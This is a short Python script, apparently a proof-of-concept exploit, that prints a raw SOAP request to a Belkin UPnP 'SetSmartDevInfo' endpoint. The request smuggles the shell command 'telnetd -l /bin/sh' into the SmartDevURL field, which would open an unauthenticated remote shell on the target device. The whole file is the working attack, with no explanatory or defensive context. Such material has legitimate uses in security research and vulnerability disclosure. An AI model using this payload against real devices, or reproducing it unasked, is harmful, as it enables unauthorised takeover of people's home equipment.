#!/usr/bin/python
import sys
import base64

head = """POST /upnp/control/basicevent1 HTTP/1.1\r\nContent-Length: %d\r\nSOAPACTION: "urn:Belkin:service:basicevent:1#SetSmartDevInfo"\r\nContent-Type: text/xml; charset="utf-8"\r\nUser-Agent: CyberGarage-HTTP/1.0\r\n\r\n"""
body="""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:SetSmartDevInfo xmlns:u="urn:Belkin:service:basicevent:1">
<SmartDevURL>'telnetd -l /bin/sh'</SmartDevURL>
</u:SetSmartDevInfo>
</s:Body>
</s:Envelope>
"""

sys.stdout.write(head%(len(body))+body)
